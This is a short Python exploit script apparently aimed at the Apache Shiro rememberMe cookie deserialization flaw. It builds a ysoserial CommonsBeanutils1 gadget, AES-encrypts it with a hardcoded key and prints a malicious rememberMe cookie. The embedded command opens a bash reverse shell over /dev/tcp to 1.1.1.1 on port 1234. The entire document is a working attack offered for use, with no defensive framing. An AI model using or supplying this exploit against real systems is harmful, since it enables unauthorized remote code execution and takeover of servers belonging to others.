# pip install pycrypto
import base64
import uuid
from random import Random
import subprocess
from Crypto.Cipher import AES

command = 'bash -i >& /dev/tcp/1.1.1.1/1234 0>&1'
key = '1AvVhdsgUs0FSA3SDFAdag=='
yso_payload = 'CommonsBeanutils1'

def encode_rememberme():
    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-BETA-all.jar', yso_payload, command], stdout=subprocess.PIPE)
    BS   = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode =  AES.MODE_CBC
    iv   =  uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

if __name__ == '__main__':
    payload = encode_rememberme()    
    # with open("payload.cookie", "w") as fpw:
        # 一般为rememberMe
    print("rememberMe={}".format(payload.decode()))
